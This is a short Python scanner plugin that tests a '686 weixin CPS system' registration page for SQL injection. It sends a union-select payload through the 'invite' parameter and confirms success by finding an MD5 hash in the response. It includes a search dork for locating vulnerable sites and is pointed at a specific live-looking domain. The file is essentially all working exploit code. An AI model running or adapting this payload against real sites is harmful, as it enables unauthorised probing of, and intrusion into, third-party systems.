#!/usr/bin/python
#-*- encoding:utf-8 -*-
#title:686 weixin CPS system SQL injection
#author: Jewer
#inurl:regist.php?invite=

def assign(service, arg):
    if service == "686_weixin":
        return True, arg
def audit(arg):
    payload = "login/regist.php?invite=-4325%20and%201=2%20union%20select+1,md5(123),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23"
    url = arg + payload
    code, head,res, errcode, _url = curl.curl2(url)
    if code==200 and '202cb962ac59075b964b07152d234b70' in res:
        security_hole(url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('686_weixin', 'http://www.ylf8888.com/')[1])